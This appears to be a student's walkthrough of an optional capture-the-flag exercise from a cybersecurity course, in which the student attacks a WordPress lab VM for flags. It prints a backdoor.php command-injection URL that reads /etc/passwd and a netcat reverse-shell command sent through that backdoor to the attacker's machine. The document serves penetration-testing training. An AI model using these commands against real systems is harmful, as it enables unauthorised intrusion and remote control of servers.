## Activity File: Attacking Target 2 (Optional)


Please note, **attacking Target 2 is not required**. It is included as an additional challenge if you are interested in assessing a more complex web application. Before attempting this challenge, make sure you complete the Wireshark analysis.

Target 2 exposes the same WordPress site as Target 1, but with better security hardening. Therefore, it must be exploited differently than Target 1. 

The steps for completing this assessment are enumerated below. All details required to capture the first three flags on Target 2 are included.


### Instructions

Target 2's IP Address: `192.168.1.115`

1. Use Nmap to identify the IP address of Target 2.

![netdiscover](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/1NETDISCOVERFORMACHINES.jpg)

2. Use Nmap to document all exposed ports and services at this IP address.

![nmapSS](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/2NMAPSSTARGET2.jpg)

3. Enumerate the web server with `nikto`.
    - **Hint**: Run: `nikto -C all -h <URL>`
    - **Note**: This creates a list of URLs the Target HTTP server exposes. What kind of website is this VM running?
    
![nikto](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/4NIKTOSCAN.jpg)

This target is running an Apache webserver with WordPress.

4. Perform a more in-depth enumeration with `gobuster`.
    - **Hint**
      - Install `gobuster` using `apt`
      
   ### First, run...
   
      `sudo apt-get update`
    
    ### Then run...
            
                 `sudo apt-get install gobuster`

 ![gobusterupdate](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/6INSTALLGOBUSTER-WORKED.jpg)
     
      - Run `gobuster -w /path/to/wordlist dir -u <URL>
        
      - Use `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` as your wordlist (`-w`).
      
 ![gobusterinstall](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/7RUNGOBUSTER1.jpg)
      
      - Pay attention to the `/vendor` directory. There may be a `flag` in there...

### It appears that the directories available are /img, /css, /wordpress, /manual, /js, /vendor. Since I was directed to the /vendor directory, we ran this: 
    `gobuster dir -u http://192.168.1.115/vendor -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
 
 ![gobustervendor](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/8GOBUSTER-VENDOR.jpg)

Ran `firefox http://192.168.1.115/Vendor` and then began snooping through the contents. Selected "Path" and found Flag 1.
 
 ![flag1](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/16FLAG1.jpg)
 
5. Use searchsploit to find any known vulnerabilities associated with the programs found in Step #4.
    **Hint**: Run `searchsploit -h`
    
    `searchsploit -u` to update
    
    `searchsploit open ssh`
    
    ![searchsploitexample](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/15SEARCHSPLOIT-OPEN-SSH.jpg)
    
    `searchsploit wordpress`
    

6. Use the provided script `exploit.sh` to exploit this vulnerability by opening an Ncat connection to your Kali VM.

    - Edit the line at the top of the script that sets the `TARGET` variable. Set it equal to the IP address of Target 2.
   
   I edited it using nano as follows:

![nanoexploitfile](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/17NANOeXPLOIT.jpg)

    - Run the script. It uploads a file called `backdoor.php` to the target server. This file can be used to execute command injection attacks.
`bash exploit.sh` Runs the script

![bashresult](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/18BashExploitResult.jpg)

    - Navigate to: `http://<Target 2 URL>/backdoor.php?cmd=<CMD>`
    
      - This allows you to run bash commands on Target 2.
      - For example, try: `http://<Target 2 URL>/backdoor.php?cmd=cat%20/etc/passwd`
      
![bashbackdoorexample](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/19BASHSCRIPTTHROUGHBACKDOOR.jpg)

    - Next, use the backdoor to open a shell session on the target.

      - On your **Kali** VM, start a netcat listener: `nc -lnvp 4444`
 
 ![sshbackdoorlistener](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/20listeningon4444SSHIN.jpg)
 
      - In the browser, use the backdoor to run: `nc <Kali IP> 4444 -e /bin/bash`. For example, your query string will look like `cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash`.
      
http://192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash

7. Using the shell you've opened on `Target 2`, find a `flag` in `/var/www`.

![flag2](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/21FLAG2.jpg)

8. Next, find a flag in the WordPress uploads directory.

`ls`
`cd wordpress`
`cd wp-content`
`cd uploads`
`cd 2018`
`cd 11`
See "flag3.png"

![flag3](https://github.com/skyeskyeskye/PENN_CYBERSECURITY_FINAL/blob/main/Target_2/Images/22FLAG3.jpg)

    - **Hint**: Use the `find` command: `find /var/www -type f -iname 'flag*'`

9. If you find all three flags -- congratulations! There is a fourth, but escalating to `root` is extremely difficult: For now, move on to completing a report about Target 2.

---

© 2021 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.
